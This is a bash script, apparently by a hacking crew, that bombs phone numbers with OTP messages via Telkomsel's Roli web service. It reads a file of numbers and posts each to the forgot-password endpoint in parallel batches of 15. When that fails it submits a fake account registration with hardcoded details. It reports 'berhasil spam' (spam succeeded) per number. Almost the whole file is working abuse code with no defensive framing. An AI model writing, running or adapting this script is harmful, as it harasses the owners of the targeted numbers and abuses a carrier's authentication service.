#!/bin/bash
# YT : zsecc0de-crew ID
hitung=15
if [[ -z $(command -v "curl") ]];then echo "belom dinstall!";fi 
function ceklist(){
	       found="NOT FOUND!"
         if [[ ! -f $vos ]]; then
         	printf "%s\n" $found
         	exit 1
         fi
}
###############################################################################
clear
GREEN=$(tput setaf 2) #HIJAU
RED=$(tput setaf 1) #MERAH
CYAN=$(tput setaf 6) #CYAN
WHITE=$(tput setaf 7) #PUTIH
NORMAL=$(tput sgr0) #NORMAL
###############################################################################
function menu() {
echo -e "
               ${RED}  Roli - SPAM - OTP
${GREEN}-------------------------------------------------------------------
${RED} ██╗    ██╗██╗██████╗ ██╗  ██╗██╗███████╗███████╗ ██████╗
 ██║    ██║██║██╔══██╗██║  ██║██║██╔════╝██╔════╝██╔════╝
 ██║ █╗ ██║██║██║  ██║███████║██║███████╗█████╗  ██║     
$WHITE ██║███╗██║██║██║  ██║██╔══██║██║╚════██║██╔══╝  ██║     
${WHITE} ╚███╔███╔╝██║██████╔╝██║  ██║██║███████║███████╗╚██████╗
  ╚══╝╚══╝ ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝ ╚═════╝        
              [Powered by ZseCc0de-Crew.ID]
-------------------------------------------------------------------                                                                 
"
}
menu
function Requ_Tsel(){
              r=https://roli.telkomsel.com/home
              gasz="curl --silent ${r}"
              greb=$($gasz | grep 'id="signForm"' | gawk -F = '{ print $2 }' | gawk '{ print $1 }' | tr -d '""')
              vos=$(echo "$greb")
              crl=$(curl --silent $vos -d "nama=zsecc0de" -d "nohp_reg=$x" -d "gender=m" -d "birth_date=12/2/1999" -d "password=zsec0de12222" -d "repassword=zsec0de12222" |  grep -Po '(?<="message":)[^,]*')
              if [[ $crl =~ "sorry this msisdn  :$x is already registered" ]]; then
                  printf "[~] mantav berhasil spam ke $x \n"
              else
                  printf "[+] mantav gagal spam ke $x \n"                  
              fi
}
function Roli_Tsel(){
            H="Upgrade-Insecure-Requests: 1"
            D="msisdn=$x"
            R="https://roli.telkomsel.com/auth/forgot_password"
	          c=$(curl -s $R --data $D \
	           -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
             -H "Accept-Language: en-US,en;q=0.5" \
             -H "Referer: https://roli.telkomsel.com/auth/forgot_password" \
             -H $H --compressed | grep -Po '(?<="message":)[^,]*')
             if [[ $c =~ "kode otp berhasil dikirimkan." ]]; then
                printf "[+] mantav berhasil spam ke %s\n" $x
            else
                Requ_Tsel
             fi
}
read -p "list here :" vos
ceklist
for x in $(cat $vos); do
   ((i=i%hitung)); ((i++==0)) && wait
    Roli_Tsel "${x}" "${vos}" &
done
wait
